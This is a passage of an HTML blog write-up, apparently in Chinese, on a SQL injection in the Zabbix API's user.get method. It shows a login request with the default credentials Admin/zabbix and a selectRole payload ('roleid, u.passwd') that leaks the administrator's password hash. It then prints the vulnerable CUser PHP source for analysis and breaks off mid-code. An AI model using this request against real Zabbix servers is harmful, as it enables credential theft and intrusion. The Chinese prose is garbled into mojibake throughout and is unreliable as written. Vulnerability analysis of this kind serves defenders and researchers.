æˆè¶Šæƒè®¿é—®é«˜æƒé™ç”¨æˆ·æ•æ„Ÿä¿¡æ¯ä»¥åŠæ‰§è¡Œæ¶æ„SQLè¯­å¥ç­‰å±å®³ã€‚</p><p>é¦–å…ˆé€šè¿‡è´¦å·å¯†ç ç™»å½•åå°</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api_jsonrpc.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span></span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json-rpc</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>106</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;jsonrpc&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2.0&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;method&quot;</span><span class="punctuation">:</span> <span class="string">&quot;user.login&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;params&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Admin&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;zabbix&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/12/20/RCBFnsmeO3qtau4.png" alt="img"></p><p>ç„¶åSQLæ³¨å…¥è·å–æ•æ„Ÿä¿¡æ¯</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api_jsonrpc.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span></span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json-rpc</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>167</span><br><span class="line"></span><br><span class="line"><span class="language-prolog">&#123;<span class="string">&quot;jsonrpc&quot;</span>: <span class="string">&quot;2.0&quot;</span>, <span class="string">&quot;method&quot;</span>: <span class="string">&quot;user.get&quot;</span>, <span class="string">&quot;params&quot;</span>: &#123;<span class="string">&quot;selectRole&quot;</span>: [<span class="string">&quot;roleid, u.passwd&quot;</span>, <span class="string">&quot;roleid&quot;</span>], <span class="string">&quot;userids&quot;</span>: <span class="string">&quot;1&quot;</span>&#125;, <span class="string">&quot;auth&quot;</span>: <span class="string">&quot;2ae264ef7c19d2c2016a302c64e974c6&quot;</span>, <span class="string">&quot;id&quot;</span>: <span class="number">1</span>&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/12/20/w8234IGXQgxqLYS.png" alt="img"></p><h1 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h1><p>å®šä½æ¼æ´ç‚¹<code>ui/include/classes/api/services/CUser.php#get</code>è¿™ä¸ªæ–¹æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$options</span> = []</span>) </span>&#123;</span><br><span class="line">  <span class="variable">$result</span> = [];</span><br><span class="line"></span><br><span class="line">  <span class="variable">$sqlParts</span> = [</span><br><span class="line">    <span class="string">&#x27;select&#x27;</span>=&gt; [<span class="string">&#x27;users&#x27;</span> =&gt; <span class="string">&#x27;u.userid&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;from&#x27;</span>=&gt; [<span class="string">&#x27;users&#x27;</span> =&gt; <span class="string">&#x27;users u&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;where&#x27;</span>=&gt; [],</span><br><span class="line">    <span class="string">&#x27;order&#x27;</span>=&gt; [],</span><br><span class="line">    <span class="string">&#x27;limit&#x27;</span>=&gt; <span class="literal">null</span></span><br><span class="line">  ];</span><br><span class="line"></span><br><span class="line">  <span class="variable">$defOptions</span> = [</span><br><span class="line">    <span class="string">&#x27;usrgrpids&#x27;</span>=&gt; <span class="literal">null</span>,</span><br><span class="line">    <span class="string">&#x27;userids&#x27;</span>=&gt; <span class="literal">null</span>,</span><br><span class="line">    <span class="string">&#x27;mediaids&#x27;</span>=&gt; <span class="literal">null</span>,</span><br><span class="line">    <span class="string">&#x27;mediatypeids&#x27;</span>=&gt; <span class="literal">null</span>,</span><br><span class="line">    <span class="comment">// filter</span></span><br><span class="line">    <span class="string">&#x27;filter&#x27;</span>=&gt; <span class="literal">null</span>,</span><br><span class="line">    <span class="string">&#x27;search&#x27;</span>=&gt; <span class="literal">null</span>,</span><br><span class="line">    <span class="string">&#x27;searchByAny&#x27;</span>=&gt; <span class="literal">null</span>,</span><br><span class="line">    <span class="string">&#x27;startSearch&#x27;</span>=&gt; <span class="literal">false</span>,</span><br><span class="line">    <span class="string">&#x27;excludeSearch&#x27;</span>=&gt; <span class="literal">false</span>,</span><br><span class="line">    <span class="string">&#x27;searchWildcardsEnabled&#x27;</span>=&gt; <span class="literal">null</span>,</span><br><span class="line">    <span class="comment">// output</span></span><br><span class="line">    <span class="string">&#x27;output&#x27;</span>=&gt; API_OUTPUT_EXTEND,</span><br><span class="line">    <span class="string">&#x27;editable&#x27;</span>=&gt; <span class="literal">false</span>,</span><br><span class="line">    <span class="string">&#x27;selectUsrgrps&#x27;</span>=&gt; <span class="literal">null</span>,</span><br><span class="line">    <span class="string">&#x27;selectMedias&#x27;</span>=&gt; <span class="literal">null</span>,</span><br><span class="line">    <span class="string">&#x27;selectMediatypes&#x27;</span>=&gt; <span class="literal">null</span>,</span><br><span class="line">    <span class="string">&#x27;selectRole&#x27;</span>=&gt; <span class="literal">null</span>,</span><br><span class="line">    <span class="string">&#x27;getAccess&#x27;</span>=&gt; <span class="literal">null</span>,</span><br><span class="line">    <span class="string">&#x27;countOutput&#x27;</span>=&gt; <span class="literal">false</span>,</span><br><span class="line">    <span class="string">&#x27;preservekeys&#x27;</span>=&gt; <span class="literal">false</span>,</span><br><span class="line">    <span class="string">&#x27;sortfield&#x27;</span>=&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sortorder&#x27;</span>=&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;limit&#x27;</span>=&gt; <span class="literal">null</span></span><br><span class="line">  ];</span><br><span class="line">  <span class="variable">$options</span> = <span class="title function_ invoke__">zbx_array_merge</span>(<span class="variable">$defOptions</span>, <span class="variable">$options</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// permission check</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">self</span>::<span class="variable">$userData</span>[<span class="string">&#x27;type&#x27;</span>] != USER_TYPE_SUPER_ADMIN) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$options</span>[<span class="string">&#x27;editable&#x27;</span>]) &#123;</span><br><span class="line">      <span class="variable">$sqlParts</span>[<span class="string">&#x27;from&#x27;</span>][<span class="string">&#x27;users_groups&#x27;</span>] = <span class="string">&#x27;users_groups ug&#x27;</span>;</span><br><span class="line">      <span class="variable">$sqlParts</span>[<span class="string">&#x27;where&#x27;</span>][<span class="string">&#x27;uug&#x27;</span>] = <span class="string">&#x27;u.userid=ug.userid&#x27;</span>;</span><br><span class="line">      <span class="variable">$sqlParts</span>[<span class="string">&#x27;where&#x27;</span>][] = <span class="string">&#x27;ug.usrgrpid IN (&#x27;</span>.</span><br><span class="line">        <span class="string">&#x27; SELECT uug.usrgrpid&#x27;</span>.</span><br><span class="line">        <span class="string">&#x27; FROM users_groups uug&#x27;</span>.</span><br><span class="line">        <span class="string">&#x27; WHERE uug.userid=&#x27;</span>.<span class="built_in">self</span>::<span class="variable">$userData</span>[<span class="string">&#x27;userid&#x27;</span>].</span><br><span class="line">      <span class="string">&#x27;)&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable">$sqlParts</span>[<span class="string">&#x27;where&#x27;</span>][] = <span class="string">&#x27;u.userid=&#x27;</span>.<span class="built_in">self</span>::<span class="variable">$userData</span>[<span class="string">&#x27;userid&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// userids</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$options</span>[<span class="string">&#x27;userids&#x27;</span>] !== <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">zbx_value2array</span>(<span class="variable">$options</span>[<span class="string">&#x27;userids&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$sqlParts</span>[<span class="string">&#x27;where&#x27;</span>][] = <span class="title function_ invoke__">dbConditionInt</span>(<span class="string">&#x27;u.userid&#x27;</span>, <span class="variable">$options</span>[<span class="string">&#x27;userids&#x27;</span>]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// usrgrpids</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$options</span>[<span class="string">&#x27;usrgrpids&#x27;</span>] !== <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">zbx_value2array</span>(<span class="variable">$options</span>[<span class="string">&#x27;usrgrpids&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$sqlParts</span>[<span class="string">&#x27;from&#x27;</span>][<span class="string">&#x27;users_groups&#x27;</span>] = <span class="string">&#x27;users_groups ug&#x27;</span>;</span><br><span class="line">    <span class="variable">$sqlParts</span>[<span class="string">&#x27;where&#x27;</span>][] = <span class="title function_ invoke__">dbConditionInt</span>(<span class="string">&#x27;ug.usrgrpid&#x27;</span>, <span class="variable">$options</span>[<span class="string">&#x27;usrgrpids&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sqlParts</span>[<span class="string">&#x27;where&#x27;</span>][<span class="string">&#x27;uug&#x27;</span>] = <span class="string">&#x27;u.userid=ug.userid&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// mediaids</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$options</span>[<span class="string">&#x27;mediaids&#x27;</span>] !== <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">zbx_value2array</span>(<span class="variable">$options</span>[<span class="string">&#x27;mediaids&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$sqlParts</span>[<span class="string">&#x27;from&#x27;</span>][<span class="string">&#x27;media&#x27;</span>] = <span class="string">&#x27;media m&#x27;</span>;</span><br><span class="line">    <span class="variable">$sqlParts</span>[<span class="string">&#x27;where&#x27;</span>][] = <span class="title function_ invoke__">dbConditionInt</span>(<span class="string">&#x27;m.mediaid&#x27;</span>, <span class="variable">$options</span>[<span class="string">&#x27;mediaids&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sqlParts</span>[<span class="string">&#x27;where&#x27;</span>][<span class="string">&#x27;mu&#x27;</span>] = <span class="string">&#x27;m.userid=u.userid&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// mediatypeids</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$options</span>[<span class="string">&#x27;mediatypeids&#x27;</span>] !== <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">zbx_value2array</span>(<span class="variable">$options</span>[<span class="string">&#x27;mediatypeids&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$sqlParts</span>[<span class="string">&#x27;from&#x27;</span>][<span class="string">&#x27;media&#x27;</span>] = <span class="string">&#x27;media m&#x27;</span>;</span><br><span class="line">    <span class="variable">$sqlParts</span>[<span class="string">&#x27;where&#x27;</span>][] = <span class="title function_ invoke__">dbConditionInt</span>(<span class="string">&#x27;m.mediatypeid&#x27;</span>, <span class="variable">$options</span>[<span class="string">&#x27;mediatypeids&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sqlParts</span>[<span class="string">&#x27;where&#x27;</span>][<span class="string">&#x27;mu&#x27;</span>] = <span class="string">&#x27;m.userid=u.userid&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// filter</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$options</span>[<span class="string">&#x27;filter&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&#x27;autologout&#x27;</span>, <span class="variable">$options</span>[<span class="string">&#x27;filter&#x27;</span>]) &amp;&amp; <span class="variable">$options</span>[<span class="string">&#x27;filter&#x27;</span>][<span class="string">&#x27;autologout&#x27;</span>] !== <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="variable">$options</span>[<span class="string">&#x27;filter&#x27;</span>][<span class="string">&#x27;autologout&#x27;</span>] = <span class="title function_ invoke__">getTimeUnitFilters</span>(<span class="variable">$options</span>[<span class="string">&#x27;filter&#x27;</span>][<span class="string">&#x27;autologout&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&#x27;refresh&#x27;</span>, <span class="variable">$options</span>[<span class="string">&#x27;filter&#x27;</span>]) &amp;&amp; <span class="variable">$options</span>[<span class="string">&#x27;filter&#x27;</span>][<span class="string">&#x27;refresh&#x27;</span>] !== <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="variable">$options</span>[<span class="string">&#x27;filter&#x27;</span>][<span class="string">&#x27;refresh&#x27;</span>] = <span class="title function_ invoke__">getTimeUnitFilters</span>(<span class="variable">$options</span>[<span class="string">&#x27;filter&#x27;</span>][<span class="string">&#x27;refresh&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;filter&#x27;</span>][<span class="string">&#x27;passwd&#x27;</span>])) &#123;</span><br><span class="line">      <span class="built_in">self</span>::<span class="title function_ invoke__">exception</span>(ZBX_API_ERROR_PARAMETERS, <span class="title function_ invoke__">_</span>(<span class="string">&#x27;It is not possible to filter by user password.&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">dbFilter</span>(<span class="string">&#x27;users u&#x27;</span>, <span class="variable">$options</span>, <span class="variable">$sqlParts</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// search</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$options</span>[<span class="string">&#x27;search&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;search&#x27;</span>][<span class="string">&#x27;passwd&#x27;</span>])) &#123;</span><br><span class="line">      <span class="built_in">self</span>::<span class="title function_ invoke__">exception</span>(ZBX_API_ERROR_PARAMETERS, <span class="title function_ invoke__">_</span>(<span class="string">&#x27;It is not possible to search by user password.&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">zbx_db_search</span>(<span class="string">&#x27;users u&#x27;</span>, <span class="variable">$options</span>, <span class="variable">$sqlParts</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// limit</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">zbx_ctype_digit</span>(<span class="variable">$options</span>[<span class="string">&#x27;limit&#x27;</span>]) &amp;&amp; <span class="variable">$options</span>[<span class="string">&#x27;limit&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$sqlParts</span>[<span class="string">&#x27;limit&#x27;</span>] = <span class="variable">$options</span>[<span class="string">&#x27;limit&#x27;</span>];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$userIds</span> = [];</span><br><span class="line"></span><br><span class="line">  <span class="variable">$sqlParts</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">applyQueryOutputOptions</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">tableName</span>(), <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">tableAlias</span>(), <span class="variable">$options</span>, <span class="variable">$sqlParts</span>);</span><br><span class="line">  <span class="variable">$sqlParts</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">applyQuerySortOptions</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">tableName</span>(), <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">tableAlias</span>(), <span class="variable">$options</span>, <span class="variable">$sqlParts</span>);</span><br><span class="line">  <span class="variable">$res</span> = <span class="title function_ invoke__">DBselect</span>(<span class="built_in">self</span>::<span class="title function_ invoke__">createSelectQueryFromParts</span>(<span class="variable">$sqlParts</span>), <span class="variable">$sqlParts</span>[<span class="string">&#x27;limit&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (<span class="variable">$user</span> = <span class="title function_ invoke__">DBfetch</span>(<span class="variable">$res</span>)) &#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$user</span>[<span class="string">&#x27;passwd&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$options</span>[<span class="string">&#x27;countOutput&#x27;</span>]) &#123;</span><br><span class="line">      <span class="variable">$result</span> = <span class="variable">$user</span>[<span class="string">&#x27;rowscount&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable">$userIds</span>[<span class="variable">$user</span>[<span class="string">&#x27;userid&#x27;</span>]] = <span class="variable">$user</span>[<span class="string">&#x27;userid&#x27;</span>];</span><br><span class="line"></span><br><span class="line">      <span class="variable">$result</span>[<span class="variable">$user</span>[<span class="string">&#x27;userid&#x27;</span>]] = <span class="variable">$user</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$options</span>[<span class="string">&#x27;countOutput&#x27;</span>]) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * Adding objects</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$options</span>[<span class="string">&#x27;getAccess&#x27;</span>] !== <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$userid</span> =&gt; <span class="variable">$user</span>) &#123;</span><br><span class="line">      <span class="variable">$result</span>[<span class="variable">$userid</span>] += [<span class="string">&#x27;gui_access&#x27;</span> =&gt; <span class="number">0</span>, <span class="string">&#x27;debug_mode&#x27;</span> =&gt; <span class="number">0</span>, <span class="string">&#x27;users_status&#x27;</span> =&gt; <span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$access</span> = <span class="title function_ invoke__">DBselect</span>(</span><br><span class="line">      <span class="string">&#x27;SELECT ug.userid,MAX(g.gui_access) AS gui_access,&#x27;</span>.</span><br><span class="line">        <span class="string">&#x27; MAX(g.debug_mode) AS debug_mode,MAX(g.users_status) AS users_status&#x27;</span>.</span><br><span class="line">        <span class="string">&#x27; FROM usrgrp g,users_groups ug&#x27;</span>.</span><br><span class="line">        <span class="string">&#x27; WHERE &#x27;</span>.<span class="title function_ invoke__">dbConditionInt</span>(<span class="string">&#x27;ug.userid&#x27;</span>, <span class="variable">$userIds</span>).</span><br><span class="line">          <span class="string">&#x27; AND g.usrgrpid=ug.usrgrpid&#x27;</span>.</span><br><span class="line">        <span class="string">&#x27; GROUP BY ug.userid&#x27;</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$userAccess</span> = <span class="title function_ invoke__">DBfetch</span>(<span class="variable">$access</span>)) &#123;</span><br><span class="line">      <span class="variable">$result</span>[<span class="variable">$userAccess</span>[<span class="string">&#x27;userid&#x27;</span>]] = <span class="title function_ invoke__">zbx_array_merge</span>(<span class="variable">$result</span>[<span class="variable">$userAccess</span>[<span class="string">&#x27;userid&#x27;</span>]], <span class="variable">$userAccess</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$result</span>) &#123;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">addRelatedObjects</span>(<span class="variable">$options</span>, <span class="variable">$result</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// removing keys</span></span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable">$options</span>[<span class="string">&#x27;preservekeys&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">zbx_cleanHashes</span>(<span class="variable">$result</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºè¿™é‡Œåœ¨è§£æä¼ å…¥çš„å‚æ•°ã€‚é¦–å…ˆå°†ä¼ å…¥çš„å‚æ•°åˆå¹¶åˆ°å‚æ•°æ¨¡æ¿ä¸­ï¼Œç„¶åæ ¹æ®åˆå¹¶åçš„å‚æ•°è°ƒæ•´SQLè¯­å¥çš„<code>from</code>ã€<code>where</code>å’Œ<code>limit</code>ç­‰å­å¥ï¼Œç„¶åæŸ¥è¯¢ç”¨æˆ·è¡¨ä¸­æ‰€æœ‰å­—æ®µ</p><p><img src="https://s2.loli.net/2024/12/20/QhujTRSH6ldm4Vn.png" alt="img"></p><p><code>fetch</code>ç»“æœé›†åï¼Œ<code>unset</code>äº†passwdè¿™ä¸ªæ•æ„Ÿå­—æ®µï¼Œæ‰€ä»¥é¢„æœŸè¿™é‡Œçš„ç»“æœæ˜¯è·å–ä¸åˆ°passwdè¿™ä¸ªå­—æ®µçš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="variable">$user</span> = <span class="title function_ invoke__">DBfetch</span>(<span class="variable">$res</span>)) &#123;</span><br><span class="line">  <span class="keyword">unset</span>(<span class="variable">$user</span>[<span class="string">&#x27;passwd&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$options</span>[<span class="string">&#x27;countOutput&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$user</span>[<span class="string">&#x27;rowscount&#x27;</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$userIds</span>[<span class="variable">$user</span>[<span class="string">&#x27;userid&#x27;</span>]] = <span class="variable">$user</span>[<span class="string">&#x27;userid&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$result</span>[<span class="variable">$user</span>[<span class="string">&#x27;userid&#x27;</span>]] = <span class="variable">$user</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¤„ç†å®ŒæŸ¥è¯¢çš„ç»“æœé›†åï¼Œåˆå‘ç»“æœé›†ä¸­æ·»åŠ äº†ä¸€äº›å¯¹è±¡ï¼Œè¿™é‡Œè°ƒç”¨äº†<code>CUser#addRelatedObjects()</code>è¿™ä¸ªæ–¹æ³•</p><p>Adds the related objects requested by â€œselect*â€ options to the resulting object set.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 